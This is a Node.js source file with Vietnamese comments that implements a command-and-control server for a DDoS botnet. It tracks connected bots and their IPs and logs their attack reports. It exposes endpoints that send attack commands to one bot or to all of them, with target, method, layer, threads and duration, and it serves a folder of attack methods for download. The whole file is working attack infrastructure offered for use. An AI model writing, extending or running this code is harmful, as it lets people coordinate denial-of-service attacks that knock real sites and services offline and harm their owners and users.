const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.json());
app.use(express.static('public'));
app.use('/methods', express.static('methods'));

// Dữ liệu
let bots = {};
let attackLog = [];

// ===== BOT KẾT NỐI =====
io.on('connection', (socket) => {
    console.log('Bot kết nối:', socket.id);
    
    // Bot đăng ký
    socket.on('register', (data) => {
        bots[socket.id] = {
            id: socket.id,
            hostname: data.hostname || 'Unknown',
            ip: data.ip || 'Unknown',
            online: true,
            status: 'ONLINE',
            lastSeen: new Date()
        };
        io.emit('bot_list', bots);  // Gửi danh sách bot cho panel
    });
    
    // Bot báo cáo trạng thái
    socket.on('report', (data) => {
        if (bots[socket.id]) {
            bots[socket.id].status = data.status;
            bots[socket.id].target = data.target;
            bots[socket.id].method = data.method;
            bots[socket.id].lastSeen = new Date();
        }
        attackLog.push({
            botId: socket.id,
            ...data,
            time: new Date()
        });
        io.emit('bot_list', bots);
        io.emit('attack_log', attackLog);
    });
    
    // Bot ngắt kết nối
    socket.on('disconnect', () => {
        if (bots[socket.id]) {
            bots[socket.id].online = false;
            bots[socket.id].status = 'OFFLINE';
        }
        io.emit('bot_list', bots);
    });
});

// ===== API: PANEL GỬI LỆNH =====
app.post('/api/attack', (req, res) => {
    const { botId, layer, method, target, threads, duration } = req.body;
    
    const command = {
        layer: layer,
        method: method,
        target: target,
        threads: threads,
        duration: duration
    };
    
    if (botId === 'ALL') {
        io.emit('attack_command', command);  // Gửi tất cả bot
    } else {
        io.to(botId).emit('attack_command', command);  // Gửi 1 bot
    }
    
    res.json({ ok: true, sent: botId || 'ALL' });
});

// ===== API: DỪNG TẤN CÔNG =====
app.post('/api/stop', (req, res) => {
    const { botId } = req.body;
    if (botId === 'ALL') {
        io.emit('stop_command');
    } else {
        io.to(botId).emit('stop_command');
    }
    res.json({ ok: true });
});

// ===== API: XEM DANH SÁCH BOT =====
app.get('/api/bots', (req, res) => {
    res.json(bots);
});

// ===== API: TẢI METHOD =====
app.get('/api/methods', (req, res) => {
    const files = fs.readdirSync('./methods');
    res.json(files);
});

// ===== PANEL HTML =====
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'panel.html'));
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, () => {
    console.log('Server running on port ' + PORT);
});